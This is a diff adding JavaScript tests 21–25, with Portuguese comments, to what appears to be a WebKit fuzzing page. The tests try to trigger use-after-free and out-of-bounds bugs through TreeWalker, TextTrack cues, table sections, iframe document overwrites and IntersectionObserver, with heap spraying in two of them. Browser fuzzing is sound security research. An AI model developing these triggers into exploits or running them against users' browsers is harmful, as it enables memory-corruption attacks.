@@ -141,5 +141,142 @@
         setTimeout(() => { test20(); }, 4500);
 
     </script>
+    
+
+
+    <script>
+        function logMsg(msg) {
+            console.log(msg);
+            let p = document.createElement("p");
+            p.innerText = msg;
+            document.getElementById("log-container").appendChild(p);
+        }
+
+        // Teste 21: TreeWalker e Deleção do Nó Atual
+        // O TreeWalker mantém um ponteiro interno nativo (C++) para o nó atual.
+        // Mudar a estrutura da árvore e remover o nó atual antes do próximo passo pode causar OOB ou UAF.
+        function test21() {
+            logMsg("Iniciando Teste 21 (TreeWalker UAF)...");
+            try {
+                let div = document.createElement("div");
+                let span = document.createElement("span");
+                div.appendChild(span);
+                
+                let walker = document.createTreeWalker(div, NodeFilter.SHOW_ELEMENT);
+                walker.currentNode = span;
+                
+                // Removemos o nó atual da árvore em que o Walker está iterando
+                span.remove();
+                
+                // Tenta forçar o motor do WebCore a calcular o próximo nó a partir do limbo
+                walker.nextNode(); 
+            } catch(e) {}
+            logMsg("Fim do Teste 21.");
+        }
+
+        // Teste 22: TextTrack (Media) Lifecycle
+        // Elementos de mídia têm subsistemas internos que não dependem de WebAudio.
+        // A faixa de legenda (TextTrack) e suas Cues gerenciam memória assíncrona.
+        function test22() {
+            logMsg("Iniciando Teste 22 (TextTrack Cue UAF)...");
+            try {
+                let video = document.createElement("video");
+                let track = video.addTextTrack("subtitles", "Fuzz", "en");
+                
+                // VTTCue está disponível no WebKit padrão e injeta blocos no backend
+                let cue = new VTTCue(0, 1, "fuzz test");
+                track.addCue(cue);
+                
+                // Desanexa o vídeo inteiro, limpando seus componentes na memória
+                video = null;
+                
+                // O track ainda possui uma referência no JavaScript, tentamos manipular
+                // um cue de um componente que deveria ter sido destruído.
+                track.removeCue(cue);
+            } catch(e) {}
+            logMsg("Fim do Teste 22.");
+        }
+
+        // Teste 23: Reestruturação Síncrona de Tabelas HTML
+        // As tabelas possuem métodos injetados diretamente em C++ (insertRow, deleteRow).
+        // Acelerar a exclusão de seções enquanto se manipula as linhas gera desvios de ponteiro.
+        function test23() {
+            logMsg("Iniciando Teste 23 (Table Section OOB)...");
+            try {
+                let table = document.createElement("table");
+                let tbody = table.createTBody();
+                let row = tbody.insertRow(0);
+                row.insertCell(0);
+                
+                // Destrói o corpo da tabela, mas a linha ainda tem referência do JS
+                tbody.remove();
+                
+                // Força o WebCore a acessar a árvore da tabela agora corrompida
+                table.insertRow(0);
+                row.innerHTML = "<td>órfão</td>";
+            } catch(e) {}
+            logMsg("Fim do Teste 23.");
+        }
+
+        // Teste 24: Iframe Document Overwrite (Dangling Pointer)
+        // Usar document.write() em um iframe limpa completamente sua árvore DOM subjacente.
+        // Reter referências do nó antigo (como o body) e tentar escrever nelas causa colapso na memória.
+        function test24() {
+            logMsg("Iniciando Teste 24 (Iframe Document Overwrite)...");
+            try {
+                let frame = document.createElement("iframe");
+                document.body.appendChild(frame);
+                
+                let doc = frame.contentDocument;
+                let bodyRef = doc.body; // Guarda o ponteiro do corpo original
+                
+                // Overwrite destrói a árvore C++ subjacente vinculada ao documento
+                doc.write("<h1>Nova Árvore</h1>");
+                doc.close();
+                
+                // Spray rápido para sobrepor a memória que o corpo antigo ocupava
+                let spray = [];
+                for(let i=0; i<500; i++) spray.push(new ArrayBuffer(256));
+                
+                // Tenta injetar nós na referência órfã
+                bodyRef.appendChild(document.createElement("div"));
+            } catch(e) {}
+            logMsg("Fim do Teste 24.");
+        }
+
+        // Teste 25: IntersectionObserver em Nó Desconectado
+        // Observadores dependem de cálculos visuais e de layout profundos.
+        // Forçar a extração síncrona de registros de um nó recém destruído e coletado pelo GC.
+        function test25() {
+            logMsg("Iniciando Teste 25 (IntersectionObserver GC)...");
+            try {
+                let target = document.createElement("div");
+                document.body.appendChild(target);
+                
+                let observer = new IntersectionObserver(() => {});
+                observer.observe(target);
+                
+                // Desconecta o elemento
+                target.remove();
+                target = null;
+                
+                // Spray massivo de strings para pressionar o Coletor de Lixo do interpretador LLInt
+                let spray = new Array(15000).fill("A".repeat(1024));
+                
+                // Força o motor C++ a processar a lista de nós alvo que podem já ter sido liberados
+                observer.takeRecords();
+                observer.disconnect();
+            } catch(e) {}
+            logMsg("Fim do Teste 25.");
+        }
+
+        // Execução Sequencial
+        setTimeout(() => { test21(); }, 500);
+        setTimeout(() => { test22(); }, 1500);
+        setTimeout(() => { test23(); }, 2500);
+        setTimeout(() => { test24(); }, 3500);
+        setTimeout(() => { test25(); }, 4500);
+
+    </script>
 </body>
 </html>
